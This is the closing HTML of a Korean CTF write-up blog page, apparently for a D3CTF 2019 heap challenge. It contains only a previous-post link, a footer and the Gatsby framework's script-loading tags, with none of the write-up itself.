+</div></div></div><div class="post-navigator"><div class="post-navigator-card-wrapper"><a class="post-card prev" href="/csaw2019_travelle_ctf_writeup/"><div class="direction">이전 글</div><div class="title">CSAW 2019 traveller 취약점 분석</div></a></div><div class="post-navigator-card-wrapper"></div></div><div class="utterances"></div></main><footer class="page-footer-wrapper"><p class="page-footer">© <!-- -->2021<!-- --> <a href="https://github.com/dnsdudrla97">Zer0Luck</a> powered by<a href="https://github.com/zoomKoding/"> zoomkoding</a></p></footer><div class="dark-mode-button-wrapper"><button class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium dark-mode-button css-1yxmbwk" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge dark-mode-icon css-6flbmm" focusable="false" viewBox="0 0 24 24" aria-hidden="true" data-testid="DarkModeIcon"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"></path></svg></button></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/d3ctf2019_new_heap_ctf_writeup/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-1c8b3614439a319fec88.js"],"app":["/app-7556968f1157cba98cd0.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-300892b2f0d9ef861b4f.js"],"component---src-pages-404-js":["/component---src-pages-404-js-214712bad1e95d0a00fb.js"],"component---src-pages-about-js":["/component---src-pages-about-js-b6c2fb7635bce234c24f.js"],"component---src-pages-index-js":["/component---src-pages-index-js-ca3dc2d79b71372fdfbb.js"],"component---src-templates-blog-template-js":["/component---src-templates-blog-template-js-c8576cef7b6a608fcd4a.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-779d460b2a3b98273321.js"]};/*]]>*/</script><script src="/polyfill-1c8b3614439a319fec88.js" nomodule=""></script><script src="/component---src-templates-blog-template-js-c8576cef7b6a608fcd4a.js" async=""></script><script src="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-f8cf487d5388e1dc0b4b.js" async=""></script><script src="/app-7556968f1157cba98cd0.js" async=""></script><script src="/framework-373e01a4682a5f0c98a3.js" async=""></script><script src="/webpack-runtime-7540f1a080c56993ae69.js" async=""></script></body></html>
